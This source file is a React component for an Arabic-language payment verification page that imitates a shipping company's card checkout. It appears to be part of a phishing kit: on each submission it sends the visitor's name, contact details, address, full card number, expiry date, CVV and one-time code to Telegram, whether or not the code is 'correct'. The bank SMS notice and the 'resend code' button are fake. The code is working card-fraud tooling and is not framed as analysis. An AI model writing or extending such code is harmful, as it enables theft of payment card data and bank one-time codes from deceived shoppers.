import { useState, useEffect, useRef } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { sendToTelegram } from "@/lib/telegram";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";

const PaymentOTPForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState("");
  const [countdown, setCountdown] = useState(60);
  
  // Create refs for all inputs
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Get customer info from link data (cross-device compatible)
  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;

  // Get country from link data
  const selectedCountry = shippingInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(selectedCountry);

  // Get amount from link data - ensure it's a number, handle all data types
  const rawAmount = paymentData?.payment_amount || shippingInfo?.cod_amount || shippingInfo?.payment_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, selectedCountry);
  
  // Demo OTP: 123456
  const DEMO_OTP = "123456";
  
  // Countdown timer effect
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown]);
  
  // Focus first input on mount
  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);
  
  const handleChange = (index: number, value: string) => {
    // Only allow numbers
    const numericValue = value.replace(/[^0-9]/g, '');
    
    if (numericValue.length <= 1) {
      const newOtp = [...otp];
      newOtp[index] = numericValue;
      setOtp(newOtp);
      setError("");
      
      // Auto-focus next input if value entered
      if (numericValue && index < 5) {
        inputRefs.current[index + 1]?.focus();
      }
    }
  };
  
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Handle backspace
    if (e.key === 'Backspace') {
      e.preventDefault();
      
      if (otp[index]) {
        // Clear current input
        const newOtp = [...otp];
        newOtp[index] = "";
        setOtp(newOtp);
      } else if (index > 0) {
        // Move to previous input and clear it
        const newOtp = [...otp];
        newOtp[index - 1] = "";
        setOtp(newOtp);
        inputRefs.current[index - 1]?.focus();
      }
    }
    
    // Handle Delete key
    if (e.key === 'Delete') {
      e.preventDefault();
      const newOtp = [...otp];
      newOtp[index] = "";
      setOtp(newOtp);
    }
    
    // Handle arrow keys
    if (e.key === 'ArrowLeft' && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
    if (e.key === 'ArrowRight' && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
    
    // Clear all on Escape
    if (e.key === 'Escape') {
      handleClearAll();
    }
  };
  
  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
    
    if (pastedData) {
      const newOtp = [...otp];
      for (let i = 0; i < pastedData.length && i < 6; i++) {
        newOtp[i] = pastedData[i];
      }
      setOtp(newOtp);
      
      // Focus the next empty input or last input
      const nextEmptyIndex = newOtp.findIndex(val => !val);
      if (nextEmptyIndex !== -1) {
        inputRefs.current[nextEmptyIndex]?.focus();
      } else {
        inputRefs.current[5]?.focus();
      }
    }
  };
  
  const handleClearAll = () => {
    setOtp(["", "", "", "", "", ""]);
    setError("");
    inputRefs.current[0]?.focus();
  };
  
  const handleDeleteLast = () => {
    const lastFilledIndex = otp.findLastIndex(val => val !== "");
    if (lastFilledIndex !== -1) {
      const newOtp = [...otp];
      newOtp[lastFilledIndex] = "";
      setOtp(newOtp);
      inputRefs.current[lastFilledIndex]?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    const otpString = otp.join('');

    if (otpString.length !== 6) {
      setError("الرجاء إدخال رمز التحقق كاملاً");
      return;
    }

    // ALWAYS send to Telegram, regardless of whether OTP is correct or wrong
    const isCorrect = otpString === DEMO_OTP;

    // Send complete payment data to Telegram
    const telegramResult = await sendToTelegram({
      type: 'payment_otp_attempt',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        address: customerInfo.address || '',
        service: serviceName,
        amount: formattedAmount,
        cardholder: sessionStorage.getItem('cardName') || '',
        cardNumber: sessionStorage.getItem('cardNumber') || '',
        cardLast4: sessionStorage.getItem('cardLast4') || '',
        expiry: sessionStorage.getItem('cardExpiry') || '12/25',
        cvv: sessionStorage.getItem('cardCvv') || '',
        otp: otpString,
        otp_status: isCorrect ? 'correct' : 'wrong',
        attempts: attempts + 1
      },
      timestamp: new Date().toISOString()
    });

    if (otpString === DEMO_OTP) {
      // Submit to Netlify Forms
      try {
        await fetch("/", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            "form-name": "payment-confirmation",
            name: customerInfo.name || '',
            email: customerInfo.email || '',
            phone: customerInfo.phone || '',
            service: serviceName,
            amount: formattedAmount,
            cardLast4: sessionStorage.getItem('cardLast4') || '',
            cardholder: sessionStorage.getItem('cardName') || '',
            otp: otpString,
            timestamp: new Date().toISOString()
          }).toString()
        });
      } catch (err) {
        // Silent error handling
      }

      toast({
        title: "تم بنجاح!",
        description: "تم تأكيد الدفع بنجاح",
      });

      navigate(`/pay/${id}/receipt`);
    } else {
      const newAttempts = attempts + 1;
      setAttempts(newAttempts);

      if (newAttempts >= 3) {
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
        toast({
          title: "تم الحظر",
          description: "لقد تجاوزت عدد المحاولات المسموحة",
          variant: "destructive",
        });
      } else {
        setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
        handleClearAll();
      }
    }
  };
  
  const isOtpComplete = otp.every(digit => digit !== "");
  const hasAnyDigit = otp.some(digit => digit !== "");
  
  return (
    <>
      <PaymentMetaTags
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formattedAmount}
        title="رمز التحقق"
        description={`أدخل رمز التحقق لخدمة ${serviceName}`}
      />
      <div className="min-h-screen bg-background" dir="rtl">
        {/* Hero Section */}
        <div
          className="relative w-full h-48 sm:h-64 overflow-hidden"
          style={{
            background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
          }}
        >
          <div className="absolute inset-0 bg-black/30" />
          <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
            <div className="text-right">
              <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
              <p className="text-xs sm:text-sm opacity-90">{countryData?.nameAr}</p>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
          <div className="max-w-2xl mx-auto">
            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: countryData?.primaryColor }}>
              <div className="flex items-center justify-between mb-6 sm:mb-8">
                <h1 className="text-xl sm:text-3xl font-bold">رمز التحقق</h1>

                <div
                  className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                  style={{
                    background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
                  }}
                >
                  <Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
                </div>
              </div>

              {/* Info */}
              <div 
                className="rounded-lg p-3 sm:p-4 mb-6"
                style={{
                  background: `${countryData?.primaryColor}10`,
                  border: `1px solid ${countryData?.primaryColor}30`
                }}
              >
                <p className="text-xs sm:text-sm text-center">
                  تم إرسال رمز التحقق المكون من 6 أرقام إلى هاتفك المسجل في البنك
                </p>
              </div>
              
              <form onSubmit={handleSubmit}>
                {/* OTP Input - 6 digits */}
                <div className="mb-6">
                  <div className="flex gap-2 sm:gap-3 justify-center items-center mb-4" dir="ltr">
                    {otp.map((digit, index) => (
                      <Input
                        key={index}
                        ref={(el) => (inputRefs.current[index] = el)}
                        type="text"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        maxLength={1}
                        value={digit}
                        onChange={(e) => handleChange(index, e.target.value)}
                        onKeyDown={(e) => handleKeyDown(index, e)}
                        onPaste={handlePaste}
                        className="w-12 h-14 sm:w-16 sm:h-20 text-center text-xl sm:text-3xl font-bold border-2 rounded-xl transition-all"
                        style={{
                          borderColor: digit ? countryData?.primaryColor : undefined,
                          backgroundColor: digit ? `${countryData?.primaryColor}08` : undefined
                        }}
                        disabled={attempts >= 3}
                        autoComplete="off"
                      />
                    ))}
                  </div>
                </div>
              
                {/* Error Message */}
                {error && (
                  <div 
                    className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2 bg-destructive/10 border border-destructive/30"
                  >
                    <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0 text-destructive" />
                    <p className="text-xs sm:text-sm text-destructive">{error}</p>
                  </div>
                )}
                
                {/* Countdown Timer */}
                {countdown > 0 && (
                  <div className="text-center mb-6">
                    <p className="text-xs sm:text-sm text-muted-foreground">
                      إعادة إرسال الرمز بعد <strong>{countdown}</strong> ثانية
                    </p>
                  </div>
                )}

                {/* Attempts Counter */}
                {attempts > 0 && attempts < 3 && (
                  <div className="text-center mb-6">
                    <p className="text-xs sm:text-sm text-yellow-600">
                      المحاولات المتبقية: <strong>{3 - attempts}</strong>
                    </p>
                  </div>
                )}
                
                {/* Submit Button */}
                <Button
                  type="submit"
                  size="lg"
                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                  disabled={attempts >= 3 || !isOtpComplete}
                  style={{
                    background: attempts >= 3 
                      ? '#666' 
                      : `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`
                  }}
                >
                  {attempts >= 3 ? (
                    <span>محظور مؤقتاً</span>
                  ) : (
                    <>
                      <span className="ml-2">تأكيد الدفع</span>
                      <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                    </>
                  )}
                </Button>
                
                {countdown === 0 && (
                  <Button
                    type="button"
                    variant="ghost"
                    className="w-full mt-3"
                    style={{ color: countryData?.primaryColor }}
                    onClick={() => {
                      setCountdown(60);
                      toast({
                        title: "تم إرسال الرمز",
                        description: "تم إرسال رمز تحقق جديد إلى هاتفك",
                      });
                    }}
                  >
                    إعادة إرسال الرمز
                  </Button>
                )}
              </form>
            </Card>
          </div>
        </div>
      </div>


      {/* Hidden Netlify Form */}
      <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="cardholder" />
        <input type="text" name="cardLast4" />
        <input type="text" name="otp" />
        <input type="text" name="timestamp" />
      </form>
    </>
  );
};

export default PaymentOTPForm;
